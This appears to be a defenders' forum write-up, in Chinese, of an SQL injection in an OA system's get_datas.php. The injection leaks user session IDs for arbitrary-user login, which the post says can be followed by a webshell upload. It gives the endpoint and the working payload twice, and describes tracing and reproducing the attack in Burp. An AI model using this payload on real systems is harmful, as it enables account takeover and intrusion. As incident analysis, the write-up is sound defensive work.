\*\*1.1漏洞特征  
通过构造绕过特殊的sql注入语句，对在线用户Session记录进行任意查询。利用该漏洞可以实现任意用户登录。配合任意文件上传漏洞，上传webshell。

1.2漏洞原理  
攻击者通过对某OA系统进行代码审计，找到get\_datas.php文件中执行sql语句的变量处于可控状态。并可以通过此漏洞获取在线用户的Session值。  
1.3利用方法  
1、使用POST方式访问

```php
/general/reportshop/utils/get_datas.php
```

payload为：

```php
USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={`\='` 1} union (select uid,sid from user_online where 1\={`=` 1})-- '1**
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-733705b63824b5cf62e3c176ae15f3259f598286.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-733705b63824b5cf62e3c176ae15f3259f598286.png)  
2、通过获取到在线用户的Session，登录general/index.php 时替换里面的Session值即可实现任意用户登录。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5f2d639cc9997b433d16c1ee17b8be61c432bf9a.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5f2d639cc9997b433d16c1ee17b8be61c432bf9a.png)

3.处置/应对措施  
PoC：

```php
USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={`\='` 1} union (select uid,sid from user_online where 1\={`=` 1})-- '1
```

4.详细分析过程  
由于攻击者触发的告警极少，因此之前的日志并未做分析。直至攻击者连接木马文件时，监测组才发现了其可疑行为。为了更好的发现问题点，我们将所有的该攻击IP的所有访问日志导出，由溯源分析组逐条的查看其可疑行为，通过时间发生的倒序排查法，最终定位到了该日志上：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e87be2a8e4966a4db2fc3d03b1ad22214c3f8e27.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e87be2a8e4966a4db2fc3d03b1ad22214c3f8e27.png)  
单纯看该攻击payload没有太高深的地方，而且告警的上下文极其不连贯，因此无法判定其如何进入的系统后台，之前单位内部有规定HW防守人员不得随意对业务系统进行测试，鉴于此我们提出跟集团领导请示进行复现漏洞的操作，并做好记录。提交申请后，组织人员对该漏洞点进行了测试。  
1、要求管理员在其单位驻地登录系统，并保持。  
2、防守人员使用burp工具对该问题点进行复现。截图如下：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-285e959d1bb35ad78560172a154bdcbc86e286be.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-285e959d1bb35ad78560172a154bdcbc86e286be.png)  
获取到相应的session值后，加入到repeater模块进行测试，当时为了检测效果先使用了错误session直接登录的方式，截图如下：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0afe703d4e9f959bb9ad703f8532ce9526e594ec.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0afe703d4e9f959bb9ad703f8532ce9526e594ec.png)  
使用正确的session值后  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-fe1f486fcfa733013e9bed0db5d67e917ac7ae1e.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-fe1f486fcfa733013e9bed0db5d67e917ac7ae1e.png)  
可以直接进入后台。至此复现完成如何实现任意用户登录的部分。